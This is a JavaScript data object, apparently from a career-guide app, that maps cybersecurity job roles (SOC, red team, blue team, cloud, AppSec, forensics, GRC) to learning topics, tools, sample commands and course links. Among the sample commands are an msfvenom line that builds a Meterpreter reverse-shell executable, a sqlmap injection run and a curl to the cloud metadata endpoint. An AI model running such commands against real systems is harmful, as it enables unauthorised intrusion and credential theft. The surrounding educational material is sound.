// CYBERSECURITY_DATA
const CYBERSECURITY_DATA = {
  "name": "Cybersecurity — Job Roles & Learning Paths (Global)",
  "short": "A→Z job roles with step-by-step learning paths, tools, commands and resources",
  "level": "All",
  "children": [
    {
      "name": "SOC (Security Operations Center)",
      "short": "Operations & monitoring ladder: L1 → L2 → L3 (Hinglish: SOC mein alert triage se expert hunting tak)",
      "level": "Beginner → Advanced",
      "children": [
        {
          "name": "SOC L1 Analyst",
          "short": "Alert triage, basic log checks, escalate to L2. (Hinglish: alerts dekhna, simple correlatons)",
          "level": "Beginner",
          "learning": [
            "Understand log sources: Windows Event Log, Linux syslog, firewall logs",
            "SIEM basics: search, dashboards, saved searches",
            "Alert triage process, ticketing and escalation",
            "Basic network fundamentals (TCP/IP, ports) and common threats"
          ],
          "tools": [
            {"name":"Splunk","why":"Search & log analytics"},
            {"name":"Elastic (ELK)","why":"Log ingestion & dashboards"},
            {"name":"OSQuery","why":"Endpoint queries"}
          ],
          "commands": [
            "Splunk example: index=main sourcetype=wineventlog | stats count by EventCode",
            "osquery example: select name, pid from processes where name like '%powershell%';"
          ],
          "resources": [
            {"title":"TryHackMe — Beginner Security Path","url":"https://tryhackme.com/paths/outline/complete-cyber-security"},
            {"title":"Splunk Tutorials","url":"https://www.splunk.com/en_us/training.html"},
            {"title":"CompTIA Security+ (cert)","url":"https://www.comptia.org/en/certifications/security/"}  // official
          ]
        },
        {
          "name": "SOC L2 Analyst",
          "short": "Deeper investigations, enrichment, basic forensics (Hinglish: analysis aur IOC enrichment)",
          "level": "Intermediate",
          "learning": [
            "Memory & disk indicators, process analysis",
            "PCAP & network flow triage (Zeek/tcpdump/Wireshark)",
            "Threat intel enrichment (VirusTotal, MISP)",
            "Root cause analysis and containment suggestions"
          ],
          "tools": [
            {"name":"Wireshark","why":"PCAP analysis"},
            {"name":"Volatility","why":"Memory forensics"},
            {"name":"MISP","why":"Threat intelligence platform"}
          ],
          "commands": [
            "tcpdump: tcpdump -n -vv -r capture.pcap",
            "volatility: volatility -f memory.dmp windows.pslist"
          ],
          "resources": [
            {"title":"Wireshark Docs","url":"https://www.wireshark.org/docs/"},
            {"title":"Volatility Foundation","url":"https://www.volatilityfoundation.org/"},
            {"title":"TryHackMe — Blue Team Path","url":"https://tryhackme.com/paths/outline/blue-team"} 
          ]
        },
        {
          "name": "SOC L3 / Threat Hunter",
          "short": "Threat hunting, custom detections and TTP mapping (Hinglish: advanced hunting & detections banana)",
          "level": "Advanced",
          "learning": [
            "Hunt methodologies (hypothesis → query → validation)",
            "Create detection rules and SIEM content",
            "MITRE ATT&CK mapping and adversary emulation",
            "Write YARA rules and behavior-based detections"
          ],
          "tools": [
            {"name":"Elastic SIEM","why":"Advanced analytics"},
            {"name":"YARA","why":"Binary/string-based detection"},
            {"name":"MITRE ATT&CK Navigator","why":"TTP mapping"}
          ],
          "commands": [
            "yara -r rules.yar sample.bin",
            "elastic query example: host.name: \"host1\" AND event.action: \"process_started\""
          ],
          "resources": [
            {"title":"MITRE ATT&CK","url":"https://attack.mitre.org/"},
            {"title":"Elastic Security","url":"https://www.elastic.co/solutions/security"},
            {"title":"SANS / GIAC Trainings (for advanced detection)","url":"https://www.giac.org/"} // GIAC/SANS
          ]
        }
      ]
    },

    {
      "name": "Red Team / Offensive Security",
      "short": "Pentesting, exploit dev, red-team ops (Hinglish: vulnerabilities dhoondhna aur exploit karna)",
      "level": "Intermediate → Advanced",
      "children": [
        {
          "name": "Penetration Tester (Web/Infra)",
          "short": "Authorized testing: web apps, infra, reporting",
          "level": "Intermediate",
          "learning": [
            "OWASP Top 10 and manual web testing methods",
            "Nmap scans, service enumeration, exploitation basics",
            "Pivoting, post-exploitation basics and report writing"
          ],
          "tools": [
            {"name":"Burp Suite","why":"Web proxy & testing"},
            {"name":"nmap","why":"Port/service discovery"},
            {"name":"Metasploit","why":"Exploit framework (use with care)"}
          ],
          "commands": [
            "nmap -sC -sV -oA target 10.10.10.5",
            "sqlmap -u 'http://target/?id=1' --batch --level=3"
          ],
          "resources": [
            {"title":"OffSec / OSCP (PEN-200)","url":"https://www.offsec.com/courses/pen-200/"},
            {"title":"TryHackMe — Offensive Path","url":"https://tryhackme.com/paths/outline/offensive-security"},
            {"title":"Hack The Box","url":"https://www.hackthebox.com/"}
          ]
        },
        {
          "name": "Exploit Developer / Binary Exploitation",
          "short": "Memory corruption, buffer overflows, ROP (Hinglish: memory aur binary hacking)",
          "level": "Advanced",
          "learning": [
            "Low-level: x86/x64 assembly, calling conventions",
            "GDB/pwndbg reverse debugging, creating ROP chains",
            "Bypassing ASLR, NX, and modern mitigations"
          ],
          "tools": [
            {"name":"GDB + pwndbg","why":"Debugging & exploit dev"},
            {"name":"pwntools","why":"Exploit scripting"},
            {"name":"Ghidra/IDA","why":"Binary reverse engineering"}
          ],
          "commands": [
            "gdb -q ./vuln",
            "python3 -c \"from pwn import *; p=process('./vuln')\""
          ],
          "resources": [
            {"title":"Pwnable.kr / CTFs","url":"https://pwnable.kr/ (CTF practice)"},
            {"title":"Ghidra","url":"https://ghidra-sre.org/"},
            {"title":"Classic exploit development tutorials (various)","url":"https://www.offsec.com/"}
          ]
        },
        {
          "name": "Red Team Operator",
          "short": "Full emulation: OPSEC, C2, lateral movement",
          "level": "Advanced",
          "learning": [
            "Operational planning, stealthy persistence methods",
            "C2 frameworks, covert channels, OPSEC",
            "Enterprise lateral movement & data exfiltration techniques"
          ],
          "tools": [
            {"name":"Cobalt Strike","why":"Red team framework (licensed)"},
            {"name":"Empire","why":"Post-exploitation framework"},
            {"name":"BloodHound","why":"AD attack path discovery"}
          ],
          "commands": [
            "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=443 -f exe -o shell.exe"
          ],
          "resources": [
            {"title":"Cobalt Strike (vendor)","url":"https://www.cobaltstrike.com/ (licensed)"},
            {"title":"BloodHound","url":"https://github.com/BloodHoundAD/BloodHound"},
            {"title":"Offensive Security resources","url":"https://www.offsec.com/"}
          ]
        }
      ]
    },

    {
      "name": "Blue Team / Defensive",
      "short": "Protect, detect and respond strategies (Hinglish: system aur network ko secure rakhna)",
      "level": "Intermediate → Advanced",
      "children": [
        {
          "name": "Incident Responder",
          "short": "Containment, eradication, recovery",
          "level": "Advanced",
          "learning": [
            "IR playbooks, containment / eradication steps",
            "Memory & disk forensics, timeline creation",
            "Communication with stakeholders and legal"
          ],
          "tools": [
            {"name":"Volatility","why":"Memory forensics"},
            {"name":"Autopsy/Sleuth Kit","why":"Disk forensics"},
            {"name":"FTK Imager","why":"Disk imaging"}
          ],
          "commands": [
            "fls -r image.dd",
            "volatility -f mem.raw windows.pslist"
          ],
          "resources": [
            {"title":"SANS Incident Response Training (GIAC)","url":"https://www.giac.org/"},
            {"title":"Autopsy","url":"https://www.sleuthkit.org/autopsy/"}
          ]
        },
        {
          "name": "Detection Engineer",
          "short": "Build analytics & SIEM content",
          "level": "Advanced",
          "learning": [
            "Analytics engineering for SIEMs, detection tuning",
            "Behavioral baselining and anomaly detection",
            "Automation for alert enrichment and triage"
          ],
          "tools": [
            {"name":"Splunk / Elastic","why":"SIEM & analytics"},
            {"name":"Sigma","why":"Detection rule standardization"}
          ],
          "commands": [
            "splunk search: index=security sourcetype=wineventlog EventCode=4624 | stats count by AccountName"
          ],
          "resources": [
            {"title":"Elastic Security Docs","url":"https://www.elastic.co/solutions/security"},
            {"title":"Splunk Education","url":"https://www.splunk.com/en_us/training.html"}
          ]
        }
      ]
    },

    {
      "name": "Cloud Security",
      "short": "Cloud IAM, misconfiguration hardening and cloud-forensics",
      "level": "Intermediate → Advanced",
      "children": [
        {
          "name": "Cloud Security Engineer",
          "short": "Harden cloud workloads, IAM best practices",
          "level": "Intermediate",
          "learning": [
            "Understand IAM, roles, policies in AWS/Azure/GCP",
            "Cloud logging (CloudTrail/CloudWatch/Azure Monitor)",
            "Threat modeling for cloud and least-privilege design"
          ],
          "tools": [
            {"name":"ScoutSuite","why":"Cloud security auditing"},
            {"name":"ScoutSuite (GitHub)","why":"Cloud misconfiguration discovery"},
            {"name":"CloudTrail / CloudWatch","why":"AWS logging"}
          ],
          "commands": [
            "curl http://169.254.169.254/latest/meta-data/   # AWS instance metadata (enumeration)"
          ],
          "resources": [
            {"title":"Pacu (AWS offensive tool)","url":"https://github.com/RhinoSecurityLabs/pacu"},
            {"title":"ScoutSuite","url":"https://github.com/nccgroup/ScoutSuite"}
          ]
        },
        {
          "name": "Cloud Penetration Tester",
          "short": "Attack paths & privilege escalation in cloud",
          "level": "Advanced",
          "learning": [
            "Attack path enumeration, privilege chaining",
            "Abuse of managed services and trust boundaries"
          ],
          "tools": [
            {"name":"Pacu","why":"AWS exploitation toolkit"},
            {"name":"CloudSploit / ScoutSuite","why":"Cloud misconfigs"}
          ],
          "resources": [
            {"title":"Pacu (GitHub)","url":"https://github.com/RhinoSecurityLabs/pacu"}
          ]
        }
      ]
    },

    {
      "name": "Application Security (AppSec) & DevSecOps",
      "short": "Secure SDLC, SAST/DAST, CI/CD security",
      "level": "Intermediate → Advanced",
      "children": [
        {
          "name": "AppSec Engineer",
          "short": "Threat modeling, code reviews, SAST/DAST",
          "level": "Intermediate",
          "learning": [
            "Threat modeling and secure design principles",
            "Static (SAST) and dynamic (DAST) analysis",
            "Secure code patterns and dependency management"
          ],
          "tools": [
            {"name":"Snyk","why":"Dependency scanning"},
            {"name":"OWASP ZAP","why":"DAST testing"},
            {"name":"SonarQube","why":"Code quality / simple SAST"}
          ],
          "resources": [
            {"title":"OWASP Top 10","url":"https://owasp.org/www-project-top-ten/"},
            {"title":"OWASP ZAP","url":"https://www.zaproxy.org/"}
          ]
        },
        {
          "name": "DevSecOps Engineer",
          "short": "Shift-left, IaC scanning, secure pipelines",
          "level": "Intermediate → Advanced",
          "learning": [
            "Integrate security into CI/CD pipelines",
            "IaC scanning (Terraform, CloudFormation), container security",
            "Runtime security & monitoring"
          ],
          "tools": [
            {"name":"Trivy","why":"Container & IaC scanning"},
            {"name":"Checkov","why":"IaC scanning"}
          ],
          "resources": [
            {"title":"Trivy","url":"https://github.com/aquasecurity/trivy"},
            {"title":"Checkov","url":"https://www.checkov.io/"}
          ]
        }
      ]
    },

    {
      "name": "Forensics & Malware Analysis",
      "short": "Static & dynamic analysis of malware, memory/disk forensics",
      "level": "Advanced",
      "children": [
        {
          "name": "Memory Forensics Analyst",
          "short": "Analyze RAM dumps for persistence & malicious behavior",
          "level": "Advanced",
          "learning": [
            "Memory acquisition & volatility plugin usage",
            "API hooks, processes, hidden threads and IO artifacts"
          ],
          "tools": [
            {"name":"Volatility","why":"Memory analysis"},
            {"name":"Rekall","why":"Alternate memory analysis"}
          ],
          "resources": [
            {"title":"Volatility Foundation","url":"https://www.volatilityfoundation.org/"}
          ]
        },
        {
          "name": "Malware Analyst",
          "short": "Reverse-engineering, sandboxing, behavior analysis",
          "level": "Advanced",
          "learning": [
            "Static disassembly & dynamic sandbox analysis",
            "Unpacking, API tracing and network behavior analysis"
          ],
          "tools": [
            {"name":"Ghidra","why":"Disassembler/RE suite"},
            {"name":"x64dbg","why":"Windows debugger"},
            {"name":"Cuckoo Sandbox","why":"Automated dynamic analysis"}
          ],
          "resources": [
            {"title":"Ghidra","url":"https://ghidra-sre.org/"},
            {"title":"Cuckoo Sandbox","url":"https://cuckoosandbox.org/"}
          ]
        }
      ]
    },

    {
      "name": "Threat Intelligence & OSINT",
      "short": "Actor profiling, IOC collection, TTP mapping",
      "level": "Advanced",
      "children": [
        {
          "name": "Threat Intel Analyst",
          "short": "Operationalize IOCs and map adversary behavior",
          "level": "Advanced",
          "learning": [
            "MITRE ATT&CK mapping, IOC ingestion",
            "Open-source intelligence collection techniques",
            "Reporting and operational dissemination"
          ],
          "tools": [
            {"name":"MISP","why":"IOC management"},
            {"name":"Maltego","why":"OSINT graphing"},
            {"name":"VirusTotal","why":"File/URL enrichment"}
          ],
          "resources": [
            {"title":"MISP","url":"https://www.misp-project.org/"},
            {"title":"Maltego","url":"https://www.maltego.com/"}
          ]
        }
      ]
    },

    {
      "name": "GRC • Risk & Compliance",
      "short": "Governance, risk assessments, compliance frameworks",
      "level": "All",
      "children": [
        {
          "name": "Security Compliance / Auditor",
          "short": "Audits, controls, policy mapping (GDPR, ISO, NIST)",
          "level": "Intermediate",
          "learning": [
            "Understand ISO27001, NIST CSF, GDPR basics",
            "Control mapping and audit evidence collection"
          ],
          "resources": [
            {"title":"NIST Cybersecurity Framework","url":"https://www.nist.gov/cyberframework"},
            {"title":"ISO/IEC 27001 (overview)","url":"https://www.iso.org/isoiec-27001-information-security.html"}
          ]
        },
        {
          "name": "Security Architect",
          "short": "Design secure enterprise systems and reference architectures",
          "level": "Advanced",
          "learning": [
            "Threat modeling during design, secure architecture patterns",
            "Control selection & trade-offs for scalability and compliance"
          ],
          "resources": [
            {"title":"ThreatModeler / resources","url":"https://www.threatmodeler.com/ (vendor)"},
            {"title":"OWASP ASVS","url":"https://owasp.org/www-project-application-security-verification-standard/"}
          ]
        }
      ]
    },

    {
      "name": "Career Paths & Certifications (global)",
      "short": "Certifications & suggested career ladders",
      "level": "All",
      "children": [
        {
          "name": "Entry • Foundations",
          "short": "A+ / Network+ / Security+ / TryHackMe beginner paths",
          "resources": [
            {"title":"CompTIA Security+","url":"https://www.comptia.org/en/certifications/security/"},
            {"title":"TryHackMe (learning paths)","url":"https://tryhackme.com/paths/outline/complete-cyber-security"}
          ]
        },
        {
          "name": "Mid • Specialist",
          "short": "OSCP, GCIA, GCIH, OSWP",
          "resources": [
            {"title":"OffSec / OSCP (PEN-200)","url":"https://www.offsec.com/courses/pen-200/"},
            {"title":"GIAC / SANS","url":"https://www.giac.org/"}
          ]
        },
        {
          "name": "Advanced • Leadership",
          "short": "OSCE, CRTO, CISSP, CISM, architect-level roles",
          "resources": [
            {"title":"ISC2 / CISSP","url":"https://www.isc2.org/certifications/cissp"},
            {"title":"CISM (ISACA)","url":"https://www.isaca.org/credentialing/cism"}
          ]
        }
      ]
    },

    {
      "name": "Practice Platforms & Labs",
      "short": "Hands-on platforms for skill development",
      "level": "All",
      "children": [
        {"name":"TryHackMe","short":"Beginner → advanced hands-on labs","resources":[{"title":"TryHackMe","url":"https://tryhackme.com/"}]},
        {"name":"Hack The Box","short":"Offensive labs & CTFs","resources":[{"title":"Hack The Box","url":"https://www.hackthebox.com/"}]},
        {"name":"VulnHub / CTFs","short":"Downloadable vulnerable VMs","resources":[{"title":"VulnHub","url":"https://www.vulnhub.com/"}]}
      ]
    },

    {
      "name": "Academic & University Programs (examples)",
      "short": "Online/Offline degree & certificate programs (examples worldwide)",
      "level": "All",
      "children": [
        {"name":"Coursera Cybersecurity Specializations","short":"University-backed online specializations","resources":[{"title":"Coursera — Cybersecurity courses","url":"https://www.coursera.org/courses?query=cybersecurity"}]},
        {"name":"edX Computer Security Courses","short":"edX micro-masters and courses","resources":[{"title":"edX — Cybersecurity","url":"https://www.edx.org/learn/cybersecurity"}]},
        {"name":"Selected University Certificates","short":"Examples: IITs / European universities (search local offerings)","resources":[{"title":"IIT Bombay Cybersecurity Certificate (news)","url":"https://timesofindia.indiatimes.com/education/news/iit-bombay-launches-certificate-programmes-in-cybersecurity-and-software-development-check-how-to-apply/articleshow/122815130.cms"}]}
      ]
    },

    {
      "name": "Tooling Master List (quick refs)",
      "short": "Important tools and quick purpose list",
      "level": "All",
      "children": [
        {"name":"nmap","short":"Port scanning & discovery","resources":[{"title":"nmap","url":"https://nmap.org/"}]},
        {"name":"Wireshark","short":"Packet capture & analysis","resources":[{"title":"Wireshark","url":"https://www.wireshark.org/"}]},
        {"name":"sqlmap","short":"Automated SQL injection tool","resources":[{"title":"sqlmap","url":"https://sqlmap.org/"}]},
        {"name":"Burp Suite","short":"Web proxy & scanner","resources":[{"title":"Burp Suite","url":"https://portswigger.net/burp"}]},
        {"name":"Metasploit","short":"Exploit framework","resources":[{"title":"Metasploit","url":"https://www.metasploit.com/"}]}
      ]
    }
  ]
};
